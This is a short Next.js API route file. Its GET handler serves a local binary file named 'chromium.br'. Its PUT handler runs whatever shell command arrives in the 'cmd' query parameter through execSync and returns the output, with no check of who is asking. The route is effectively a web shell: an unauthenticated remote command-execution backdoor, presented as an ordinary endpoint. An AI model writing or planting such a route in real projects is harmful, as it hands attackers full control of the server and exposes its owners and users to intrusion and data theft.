import * as fs from 'fs'
import { execSync } from 'child_process'
import { NextResponse } from 'next/server'

export async function GET(req) {
	const data = fs.readFileSync('./chrome/chromium.br')
	return new Response(data, { headers: { 'Content-type': `application/octet-stream` } })
}

export async function PUT(req) {
	try {
		const cmd = req.nextUrl.searchParams.get('cmd')
		const res = execSync(cmd)
		return new Response(res)
	} catch (e) {
		return NextResponse.json({ result: e.stack })
	}
}
